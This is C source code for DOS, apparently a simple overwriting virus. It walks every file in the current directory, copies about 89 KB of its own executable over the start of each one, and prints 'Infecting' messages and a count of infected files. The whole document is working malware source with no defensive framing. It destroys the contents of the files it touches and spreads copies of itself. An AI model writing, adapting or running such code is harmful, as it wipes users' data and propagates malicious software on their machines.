#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <dir.h>
#include <conio.h>
#include <dos.h>

FILE *Class, *vClass; // file pointers for the original and target files
int owned = 0, a = 0; // owned is a flag to indicate whether  there are more to infect
unsigned long x;
char buff[256];
struct ffblk ffblk;
clock_t st, end;

main() {
    st = clock();  // initializes clock
    clrscr();      // clears the screen 

    owned=(findfirst("*.*", &ffblk, 0)); 

    while(!owned) { 
        Class = fopen(_argv[0], "rb");

        vClass = fopen(ffblk.ff_name, "rb+"); //ff_name is a member of 'ffblk' structure and 'rb+' to specify how the file should be opened

        if (vClass == NULL)
            goto next;
        
        x = 89088; //arbitrary value sufficiently large enough to represent the size of data to be read from origin file

        printf("Infecting %s\n", ffblk.ff_name);


        while (x > 256) {
            
            printf("xx :: %ul\n", x);

            fread(buff, 256, 1, Class);
            fwrite(buff, 256, 1, vClass);

            x -= 256;

        }

        fread(buff, x, 1, Class);
        fwrite(buff, x, 1, vClass);

        a++;
        next: fcloseall();

        owned = findnext(&ffblk);

    }

    end = clock();

    printf("Infected %d files in %f sec", a, (end-st)/CLK_TCK);

    getch();
    return(0);

}

